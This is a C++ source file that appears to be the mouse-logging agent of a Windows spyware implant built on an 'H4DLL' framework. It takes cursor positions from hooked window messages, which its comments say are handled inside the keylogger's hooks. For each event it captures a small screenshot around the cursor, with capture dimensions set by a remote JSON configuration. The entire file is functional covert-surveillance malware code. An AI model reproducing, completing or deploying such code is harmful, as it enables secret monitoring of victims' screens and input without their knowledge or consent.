#define _CRT_SECURE_NO_WARNINGS 1

#include <Windows.h>
#include <Windowsx.h>
#include <json/JSON.h>
#include <time.h>
#include "../../H4DLL/common.h"
#include "../../H4DLL/H4-DLL.h"
#include "../../H4DLL/bss.h"
#include "../../H4DLL/AM_Core.h"
#include "../../H4DLL/HM_IpcModule.h"
#include "../../H4DLL/HM_InbundleHook.h"
#include <rcs/bin_string.h>
#include "../../H4DLL/LOG.h"
#include "../../H4DLL/process.h"
#include "../../H4DLL/HM_BitmapCommon.h"

#include "HM_KeyLog.h"

// XXX Gli hook della PeekMessage e GetMessage sono all'interno di quelli del keylog
#define DEFAULT_MOUSE_X_CAP 40
#define DEFAULT_MOUSE_Y_CAP 40
DWORD mouse_x_cap = 0, mouse_y_cap = 0;

DWORD WINAPI PM_MouseLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
{
	int xPos, yPos;
	HWND hwnd = (HWND) dwFlags;

	KEY_PARAMS *key_params; // XXX Definita in HM_KeyLog.h
	key_params = (KEY_PARAMS *)msg;
	
	xPos = GET_X_LPARAM(key_params->lprm); 
	yPos = GET_Y_LPARAM(key_params->lprm); 

	TakeMiniSnapShot(PM_MOUSEAGENT, hwnd, xPos, yPos, mouse_x_cap, mouse_y_cap);

	return 1;
}


DWORD WINAPI PM_MouseLogStartStop(BOOL bStartFlag, BOOL bReset)
{
	// Durante la sync gli agenti continuano a scrivere nella coda.
	// Solo una start/stop esplicita fa cambiare stato agli hook
	if (bReset)
		AM_IPCAgentStartStop(PM_MOUSEAGENT, bStartFlag);
	
	return 1;
}


DWORD WINAPI PM_MouseLogInit(JSONObject elem)
{
	mouse_x_cap = (DWORD) elem[L"width"]->AsNumber();
	mouse_y_cap = (DWORD) elem[L"height"]->AsNumber();

	return 1;
}


void PM_MouseLogRegister()
{
	AM_MonitorRegister("mouse", PM_MOUSEAGENT, (BYTE *)PM_MouseLogDispatch, (BYTE *)PM_MouseLogStartStop, (BYTE *)PM_MouseLogInit, NULL);
}